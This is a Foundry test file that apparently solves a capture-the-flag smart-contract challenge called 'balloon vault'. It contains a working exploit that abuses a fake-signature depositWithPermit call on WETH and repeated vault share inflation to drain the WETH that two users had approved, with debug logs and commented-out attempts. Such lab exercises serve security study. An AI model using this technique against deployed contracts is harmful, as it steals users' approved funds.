// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import {WETH} from "../src/5_balloon-vault/WETH.sol";
import {BallonVault} from "../src/5_balloon-vault/Vault.sol";

/*////////////////////////////////////////////////////////////
//          DEFINE ANY NECESSARY CONTRACTS HERE             //
//    If you need a contract for your hack, define it below //
////////////////////////////////////////////////////////////*/

/*////////////////////////////////////////////////////////////
//                     TEST CONTRACT                        //
////////////////////////////////////////////////////////////*/
contract Challenge5Test is Test {
    BallonVault public vault;
    WETH public weth = new WETH();

    address public attacker = makeAddr("attacker");
    address public bob = makeAddr("bob");
    address public alice = makeAddr("alice");

    function setUp() public {
        vault = new BallonVault(address(weth));

        // Attacker starts with 10 ether
        vm.deal(address(attacker), 10 ether);

        // Set up Bob and Alice with 500 WETH each
        weth.deposit{value: 1000 ether}();
        weth.transfer(bob, 500 ether);
        weth.transfer(alice, 500 ether);

        vm.prank(bob);
        weth.approve(address(vault), 500 ether);
        vm.prank(alice);
        weth.approve(address(vault), 500 ether);
    }

    function testExploit() public {
        vm.startPrank(attacker);
        /*////////////////////////////////////////////////////
        //               Add your hack below!               //
        //                                                  //
        // terminal command to run the specific test:       //
        // forge test --match-contract Challenge5Test -vvvv //
        ////////////////////////////////////////////////////*/
        weth.deposit{value: 10 ether}();

        weth.approve(address(vault), 1000 ether);

        while (weth.balanceOf(address(alice)) > 0) {
            uint256 attackerShares = vault.deposit(1, address(attacker));
            console.log("attackerShares", attackerShares);

            // weth.transfer(address(vault), 1 ether);
            uint256 attackerBalance = weth.balanceOf(address(attacker));
            uint256 aliceBalance = weth.balanceOf(address(alice));

            uint256 load = aliceBalance < attackerBalance ? aliceBalance : attackerBalance;
            console.logUint(load);
            weth.transfer(address(vault), load);
            vault.depositWithPermit(address(alice), load, block.timestamp + 1 days, 0, "0", "0");

            uint256 attackerBalanceInVault = vault.balanceOf(address(attacker));
            uint256 aliceBalanceInVault = vault.balanceOf(address(alice));
            console.log("***********************", weth.balanceOf(address(vault)));
            // weth.withdraw(load);
            // vault.withdraw(attackerBalanceInVault, address(attacker), address(attacker));
            vault.redeem(attackerShares, address(attacker), address(attacker));

            attackerBalance = weth.balanceOf(address(attacker));
        }

        uint256 attackerShares = vault.deposit(1, address(attacker));

        weth.transfer(address(vault), 500 ether);
        vault.depositWithPermit(address(bob), 500 ether, block.timestamp + 1 days, 0, "0", "0");

        vault.redeem(attackerShares, address(attacker), address(attacker));

        // vault.depositWithPermit(address(alice), 500 ether , block.timestamp + 1 days, 0, '0', '0');
        // vault.depositWithPermit(address(bob), 500 ether , block.timestamp + 1 days, 0, '0', '0');
        // vault.withdraw(50 ether,   address(alice),address(attacker));
        // console.log(block.timestamp);
        // console.log(block.timestamp + 1 days);

        // vault.transferFrom(address(alice), address(attacker), 500 ether);
        // weth.safeTransferFrom(address(alice), address(attacker),500 ether);

        //==================================================//
        vm.stopPrank();

        assertGt(weth.balanceOf(address(attacker)), 1000 ether, "Attacker should have more than 1000 ether");
    }
}
